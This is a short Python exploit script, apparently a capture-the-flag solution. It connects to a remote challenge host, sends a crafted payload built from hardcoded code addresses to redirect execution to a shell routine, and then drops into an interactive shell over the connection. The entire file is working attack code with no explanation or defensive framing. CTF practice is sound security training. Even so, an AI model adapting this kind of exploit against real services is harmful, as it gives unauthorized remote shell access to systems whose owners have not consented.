#!/usr/bin/env python
from sc_pwn import *

rhp     = ('1.ctf.link',1031)

addr_exec_sh    = 0x4006e0
addr_return     = 0x4005d9

#==========
def attack(nc):
    offset  = 0x98

    diff = addr_exec_sh - addr_return
    exploit = ''
    while diff:
        exploit += chr(offset)*(diff&0xff)
        offset += 1
        diff >>= 8

    nc.sendln(exploit)
    nc.read_all()

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
